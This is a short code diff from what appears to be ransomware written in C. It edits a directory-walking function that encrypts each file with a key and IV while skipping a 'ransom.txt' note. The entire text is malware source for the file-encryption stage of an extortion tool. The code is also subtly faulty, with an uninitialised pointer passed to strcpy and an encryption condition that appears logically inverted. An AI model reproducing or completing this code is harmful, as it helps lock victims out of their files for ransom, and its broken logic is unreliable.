@@ -82,14 +82,14 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
                 char *filename;
                 strcpy(filename,name);
                 strcat(filename,"/");
-                strcat(filename,rep->d_name);
+                strcat(filename,dir->d_name);
 
                 //Encrypt
                 if (de_flag == 0){
-                    if(is_encrypted(filename) == 0){
+                    if((is_encrypted(filename) == 0) || strcmp(filename,"ransom.txt")!=0){
                         continue;
                     }
-                    else if(strcmp(filename,"ransom.txt")!=0){
+                    else{
                         encrypt(key,iv,filename);
                     }
                 }
